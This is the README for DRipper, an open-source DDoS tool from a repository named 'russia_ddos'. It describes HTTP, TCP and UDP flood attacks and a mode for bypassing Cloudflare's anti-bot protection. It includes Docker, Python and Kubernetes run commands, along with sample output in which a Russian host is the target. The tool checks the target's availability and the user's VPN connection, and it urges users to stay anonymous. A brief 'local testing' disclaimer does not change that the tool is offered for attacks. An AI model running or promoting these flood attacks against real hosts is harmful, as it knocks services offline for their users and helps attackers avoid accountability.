# DRipper

[![Build status][actions build badge]][actions build link]
[![Docker Pulls][docker pulls badge]][docker pulls link]
[![Docker Image Version (latest semver)][dockerhub badge]][dockerhub link]
[![License: MIT][license badge]][license link]

DESCRIPTION
-----------

This is reworked version of [DRipper](https://gist.github.com/scamp/33807688d0ebdcfbd4c29a4b992a8b54).
This script support HTTP/TCP/UDP flood attack. We recommend using this script for your own test purposes in the local (on-premise) environment to improve your own web services against DDoS attacks.

## Prerequisites

- Python 3.9 or higher
- Docker (optional) if you'd like to run script with docker

## Features

### Attacks

- HTTP Flood - OSI Layer 7 method volumetric attack type
- HTTP Bypass - OSI Layer 7 method volumetric attack type with to bypass Cloudflare's anti-bot page (also known as "I'm Under Attack Mode", or IUAM)
- TCP Flood - OSI Layer 4 method volumetric attack type
- UDP Flood - OSI Layer 4 method volumetric attack type

### Other features

- Detailed statistics with deep attack log for better attack analysis during the attack
- Display average request rate and throughput
- Periodic checks of your public IP address to ensure your privacy and VPN connection survivability.
- Automatic and periodic checks for the availability of the attacked host
- Distributed statistics of the response code for the attacked host, which helps you to understand the effectiveness of attacks
- Detection of redirects and rate limits with alerts in the event log

## How it looks

```bash
──────────────────────────────────── Starting DRipper ────────────────────────────────────
[23:29:24] (1/5) Trying connect to www.localhost.orc:443...                services.py:108
──────────────────────────────────────────────────────────────────────────────────────────


                   ██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
                   ██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
                   ██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
                   ██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
                   ██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
                   ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                               v2.3.0

             It is the end user's responsibility to obey all applicable laws.
             It is just like a server testing script and Your IP is visible.
                           Please, make sure you are ANONYMOUS!

                        https://github.com/alexmon1989/russia_ddos

 ────────────────────────────────────────────────────────────────────────────────────────
  Description                         Status
 ────────────────────────────────────────────────────────────────────────────────────────
  Start Time, duration                2022-03-31 23:29:23 - 0:00:33
  Your Country, Public IP             DK   45.*.*.*
  Host Country, IP                    RU   127.0.0.1:443
  HTTP Request                        GET: https://www.localhost.orc:443/
  Attack Method                       http-flood
 ────────────────────────────────────────────────────────────────────────────────────────
  Threads                             2
  vCPU Count                          16
  Socket Timeout (seconds)            1
  Random Packet Length                False
 ────────────────────────────────────────────────────────────────────────────────────────
  CloudFlare DNS Protection           Not protected
  Last Availability Check             23:29:36
  Host Availability                   Accessible in 19 of 21 zones (90%)
 ────────────────────────────────────────────────────────────────────────────────────────
  HTTP-FLOOD Statistics
 ────────────────────────────────────────────────────────────────────────────────────────
  Sent Bytes @ AVG speed                  99.18 MB @ 2.92 MB/s
  Sent Packets @ AVG speed                 232,632 @ 6859 packets/s
  Connections                         success: 4, failed: 0, success rate: 100 %
 ────────────────────────────────────────────────────────────────────────────────────────
  Status Code Distribution            400: 100%
 ────────────────────────────────────────────────────────────────────────────────────────

  Events Log
 ────────────────────────────────────────────────────────────────────────────────────────
  [23:29:24]  info   thread-2    Set attack method to http-flood
  [23:29:24]  info   thread-1    Creating HTTP connection...
  [23:29:24]  info   thread-2    Creating HTTP connection...
  [23:29:25]  info   thread-5    Checking host statuses with check-host.net
  [23:29:34]  warn   thread-1    Checked Response status... 400: Bad Request
  [23:29:36]  info   thread-5    Host statuses updated with check-host.net
  [23:29:43]  warn   thread-2    Checked Response status... 400: Bad Request
  [23:29:54]  info   thread-2    Creating HTTP connection...
  [23:29:54]  warn   thread-1    Checked Response status... 400: Bad Request
  [23:29:54]  info   thread-1    Creating HTTP connection...

                            Press CTRL+C to interrupt process.

                                    #StandWithUkraine
```

## Usage

DRipper can run on Windows/Linux/macOS from command line.
We recommend to use `PowerShell` for Windows users to run the script, Linux/macOS users can use any shell.

Run `dripper --help` to see detailed params description.


## How to Run

#### Using Docker

```bash
# HTTP flood
docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100 -m http-flood
# or
docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100
# or even
docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1 -t 100

# TCP flood
docker run -it --rm alexmon1989/dripper:latest -s tcp://127.0.0.1:80 -t 100 -l 2048

# UDP flood
docker run -it --rm alexmon1989/dripper:latest -s udp://127.0.0.1:80 -t 100 -l 2048
```

#### Directly with Python.

Ensure you have Python 3.9 or better installed. Then clone this repo and run DRipper.py with params you need

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# Install dependencies
python3 -m pip install --upgrade pip git+https://github.com/alexmon1989/russia_ddos.git
# Run script
dripper -s udp://127.0.0.1:80 -t 100 -r 1


# ===== Alternative variant =====

# Install python dependencies:
pip install -r requirements.txt
# Run script
python3 DRipper.py -s udp://127.0.0.1:80 -t 100 -r 1
```

#### Kubernetes

You can deploy and run DRipper in Kubernetes cluster using [kube-dripper][kube-dripper-link] terraform configuration.
For details - see the [README][kube-dripper-readme] from **kube-dripper** project.

## How to run unit tests

#### Prepare
```bash
pip install pytest
```

#### Run
```bash
pytest
```

# License

This project is distributed under the MIT License, see [LICENSE](./LICENSE) for more information.

<!-- External links -->
[actions build badge]: https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml/badge.svg
[actions build link]:  https://github.com/alexmon1989/russia_ddos/actions/workflows/build.yml

[docker pulls link]:   https://hub.docker.com/r/alexmon1989/dripper
[docker pulls badge]:  https://img.shields.io/docker/pulls/alexmon1989/dripper
[dockerhub link]:      https://hub.docker.com/r/alexmon1989/dripper/tags
[dockerhub badge]:     https://img.shields.io/docker/v/alexmon1989/dripper?label=DockerHub

[kube-dripper-link]:   https://github.com/denismakogon/kube-dripper
[kube-dripper-readme]: https://github.com/denismakogon/kube-dripper/blob/main/README.md

[license badge]:       https://img.shields.io/badge/License-MIT-yellow.svg
[license link]:        ./LICENSE
